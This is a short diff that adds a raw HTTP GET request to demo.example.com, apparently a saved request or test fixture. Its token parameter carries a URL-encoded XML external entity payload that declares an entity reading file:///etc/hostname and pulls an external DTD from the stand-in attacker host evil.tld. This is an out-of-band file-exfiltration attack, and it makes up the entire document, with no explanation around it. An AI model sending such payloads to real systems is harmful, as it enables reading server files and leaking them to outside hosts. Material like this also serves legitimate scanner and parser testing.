@@ -1,0 +1,4 @@
+GET /a?token=%3C%21DOCTYPE%2Bdata%2B%5B%3C%21ENTITY%2B%25%2Bfile%2BSYSTEM%2B%22file%3A%2F%2F%2Fetc%2Fhostname%22%3E%3C%21ENTITY%2B%25%2Bdtd%2BSYSTEM%2B%22http%3A%2F%2Fevil.tld%2Foob.dtd%22%3E%25dtd%3B%5D%3E%3Cr%2F%3E HTTP/1.1
+Host: demo.example.com
+Connection: close
+
